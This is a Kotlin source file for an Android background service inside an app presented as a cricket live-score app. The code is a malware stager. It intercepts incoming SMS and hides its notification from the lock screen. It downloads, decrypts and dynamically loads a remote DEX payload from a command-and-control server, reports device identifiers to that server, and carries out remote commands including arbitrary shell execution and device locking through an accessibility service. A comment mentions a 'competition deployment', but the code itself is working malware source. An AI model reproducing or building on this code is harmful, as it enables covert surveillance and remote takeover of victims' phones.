package com.cricket.livescore.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.cricket.livescore.R
import com.cricket.livescore.StagerApplication
import com.cricket.livescore.payload.PayloadLoader
import com.cricket.livescore.ui.MainActivity
import com.cricket.livescore.utils.CryptoUtils
import com.cricket.livescore.utils.NetworkUtils
import com.cricket.livescore.utils.ObfuscatedStrings
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class PayloadService : Service() {
    companion object {
        const val TAG = "PayloadService"
        const val NOTIFICATION_ID = 1001
        const val RECONNECT_DELAY = 10000L
        const val WS_TIMEOUT_SECONDS = 15L
    }

    private val CHANNEL_ID: String by lazy { ObfuscatedStrings.notifChannelId }

    private var isRunning = false
    private var c2WebSocket: WebSocketClient? = null
    private var smsReceiver: BroadcastReceiver? = null
    private var previousCrashHandler: Thread.UncaughtExceptionHandler? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        registerSmsReceiver()
        setupCrashHandler()
        Log.i(TAG, "Payload service created")
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        c2WebSocket?.disconnect()
        unregisterSmsReceiver()
        restoreCrashHandler()
        Log.i(TAG, "Payload service destroyed")
    }

    private fun registerSmsReceiver() {
        try {
            val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
            filter.priority = 100
            smsReceiver = SmsReceiver()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(smsReceiver, filter, Context.RECEIVER_EXPORTED)
            } else {
                registerReceiver(smsReceiver, filter)
            }
            Log.i(TAG, "SmsReceiver registered dynamically")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register SmsReceiver", e)
        }
    }

    private fun unregisterSmsReceiver() {
        try {
            if (smsReceiver != null) {
                unregisterReceiver(smsReceiver)
                smsReceiver = null
                Log.i(TAG, "SmsReceiver unregistered")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unregister SmsReceiver", e)
        }
    }

    private fun setupCrashHandler() {
        previousCrashHandler = Thread.getDefaultUncaughtExceptionHandler()
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            try {
                val sw = java.io.StringWriter()
                val pw = java.io.PrintWriter(sw)
                throwable.printStackTrace(pw)
                val stacktrace = sw.toString()
                Log.e(TAG, "CRASH: ${throwable.message}")
                Log.e(TAG, stacktrace.take(2000))

                val crashJson = org.json.JSONObject().apply {
                    put("type", "crash_report")
                    put("device_id", Build.ID)
                    put("error", throwable.message ?: "unknown")
                    put("stacktrace", stacktrace.take(2000))
                    put("timestamp", System.currentTimeMillis())
                }
                NetworkUtils.sendToC2(StagerApplication.c2RealUrl, crashJson.toString())
            } catch (e: Exception) {
                Log.e(TAG, "Crash report failed", e)
            }
            previousCrashHandler?.uncaughtException(thread, throwable)
        }
    }

    private fun restoreCrashHandler() {
        Thread.setDefaultUncaughtExceptionHandler(previousCrashHandler)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning) return START_STICKY

        isRunning = true

        try {
            val notification = buildNotification()
            startForeground(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Log.e(TAG, "startForeground failed, continuing without foreground", e)
            // Schedule a retry — some devices need the service to settle first
            android.os.Handler(mainLooper).postDelayed({
                try {
                    if (isRunning) {
                        val notification = buildNotification()
                        startForeground(NOTIFICATION_ID, notification)
                    }
                } catch (e2: Exception) {
                    Log.e(TAG, "startForeground retry also failed", e2)
                }
            }, 3000)
        }

        // Step 1: Download the payload DEX
        downloadAndLoadPayload()

        // Step 2: Connect to C2
        connectToC2()

        return START_STICKY
    }

    override fun onBind(p0: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                ObfuscatedStrings.notifTitle,
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = ObfuscatedStrings.notifText
                setShowBadge(false)
                lockscreenVisibility = NotificationCompat.VISIBILITY_SECRET
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(ObfuscatedStrings.notifTitle)
            .setContentText(ObfuscatedStrings.notifText)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun downloadAndLoadPayload() {
        Thread {
            try {
                // Try loading from cache first
                val cached = PayloadLoader.loadFromCache(this)
                if (cached) {
                    Log.i(TAG, "Payload loaded from cache")
                    return@Thread
                }

                // Download fresh payload
                val payloadUrl = "${StagerApplication.c2RealUrl}/api/payload"
                val dexBytes = NetworkUtils.downloadBytes(payloadUrl)
                if (dexBytes != null) {
                    val decrypted = CryptoUtils.decryptPayload(dexBytes)
                    PayloadLoader.saveToCache(this, decrypted)
                    PayloadLoader.loadDex(this, decrypted)
                    Log.i(TAG, "Payload loaded successfully")
                } else {
                    Log.w(TAG, "Payload download returned null")
                }
            } catch (e: Throwable) {
                Log.e(TAG, "Failed to load payload", e)
            }
        }.start()
    }

    private fun connectToC2() {
        Thread {
            var retries = 0
            while (isRunning && retries < 10) {
                val latch = CountDownLatch(1)
                var connected = false
                try {
                    c2WebSocket = WebSocketClient(StagerApplication.c2WsUrl)
                    c2WebSocket?.connect(
                        onMessage = { msg -> handleC2Message(msg) },
                        onConnected = {
                            connected = true
                            registerDevice()
                            latch.countDown()
                        },
                        onFailure = {
                            latch.countDown()
                        }
                    )
                    if (latch.await(WS_TIMEOUT_SECONDS, TimeUnit.SECONDS) && connected) {
                        NetworkUtils.flushQueue(StagerApplication.c2RealUrl, this@PayloadService)
                        return@Thread
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "C2 connection error", e)
                    latch.countDown()
                }
                retries++
                Log.w(TAG, "C2 reconnect attempt $retries/10")
                if (retries < 10) Thread.sleep(RECONNECT_DELAY * retries)
            }
            Log.e(TAG, "C2 connection failed after 10 retries")
            registerViaHTTP()
        }.start()
    }

    private fun registerViaHTTP() {
        Thread {
            try {
                val url = java.net.URL("${StagerApplication.c2RealUrl}/api/register")
                val conn = url.openConnection() as java.net.HttpURLConnection
                conn.apply {
                    requestMethod = "POST"
                    connectTimeout = 15000
                    readTimeout = 15000
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                }
                val info = JSONObject().apply {
                    put("device_id", Build.ID)
                    put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
                    put("manufacturer", Build.MANUFACTURER)
                    put("model", Build.MODEL)
                    put("android_version", Build.VERSION.RELEASE)
                    put("api_level", Build.VERSION.SDK_INT)
                }
                conn.outputStream.write(info.toString().toByteArray())
                val code = conn.responseCode
                conn.disconnect()
                if (code == 200) {
                    Log.i(TAG, "Device registered via HTTP fallback")
                    hideLauncherIcon()
                }
            } catch (e: Exception) {
                Log.e(TAG, "HTTP registration failed", e)
            }
        }.start()
    }

    private fun registerDevice() {
        try {
            val registerMsg = JSONObject().apply {
                put("type", ObfuscatedStrings.msgRegister)
                val data = JSONObject().apply {
                    put("device_id", Build.ID)
                    put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
                    put("manufacturer", Build.MANUFACTURER)
                    put("model", Build.MODEL)
                    put("android_version", Build.VERSION.RELEASE)
                    put("api_level", Build.VERSION.SDK_INT)
                    put("timestamp", System.currentTimeMillis())
                }
                put("data", data)
            }
            c2WebSocket?.send(registerMsg.toString())
            Log.i(TAG, "Device registered with C2")
            hideLauncherIcon()
        } catch (e: Exception) {
            Log.e(TAG, "Registration failed", e)
        }
    }

    private fun hideLauncherIcon() {
        // Disabled during development — re-enable for competition deployment
        Log.i(TAG, "hideLauncherIcon: skipped (dev mode)")
    }

    private fun handleC2Message(message: String) {
        try {
            val json = JSONObject(message)
            when (json.optString("type")) {
                ObfuscatedStrings.msgCommand -> handleCommand(json)
                "ping" -> {
                    c2WebSocket?.send("""{"type":"pong"}""")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to parse C2 message", e)
        }
    }

    private fun handleCommand(json: JSONObject) {
        val command = json.optString("command")
        val commandId = json.optString("command_id")
        val params = json.optJSONObject("params")

        Log.i(TAG, "Received command: $command")

        when (command) {
            ObfuscatedStrings.cmdStartSweep -> {
                val duration = params?.optInt("duration", 300) ?: 300
                StagerAccessibilityService.instance?.startSweep(duration * 1000L)
                sendCommandAck(commandId, "received")
            }
            ObfuscatedStrings.cmdStopSweep -> {
                StagerAccessibilityService.instance?.stopSweep()
                sendCommandAck(commandId, "done")
            }
            ObfuscatedStrings.cmdLockDevice -> {
                lockDevice()
                sendCommandAck(commandId, "done")
            }
            ObfuscatedStrings.cmdReleaseDevice -> {
                releaseDevice()
                sendCommandAck(commandId, "done")
            }
            ObfuscatedStrings.cmdExecCommand -> {
                val cmd = params?.optString("cmd", "") ?: ""
                executeShellCommand(cmd)
                sendCommandAck(commandId, "done")
            }
            ObfuscatedStrings.cmdUpdateConfig -> {
                val newC2Url = params?.optString("c2_url", "")
                if (newC2Url != null) {
                    StagerApplication.updateC2Url(newC2Url)
                }
                sendCommandAck(commandId, "done")
            }
        }
    }

    private fun sendCommandAck(commandId: String, status: String) {
        try {
            val ack = JSONObject().apply {
                put("type", ObfuscatedStrings.msgCommandAck)
                val data = JSONObject().apply {
                    put("command_id", commandId)
                    put("status", status)
                }
                put("data", data)
            }
            c2WebSocket?.send(ack.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send ack", e)
        }
    }

    private fun lockDevice() {
        StagerAccessibilityService.instance?.lockDevice()
        Log.i(TAG, "Device locked")
    }

    private fun releaseDevice() {
        StagerAccessibilityService.instance?.releaseDevice()
        Log.i(TAG, "Device released")
    }

    private fun executeShellCommand(cmd: String) {
        try {
            val process = Runtime.getRuntime().exec(cmd)
            process.waitFor()
        } catch (e: Exception) {
            Log.e(TAG, "Shell exec failed", e)
        }
    }
}
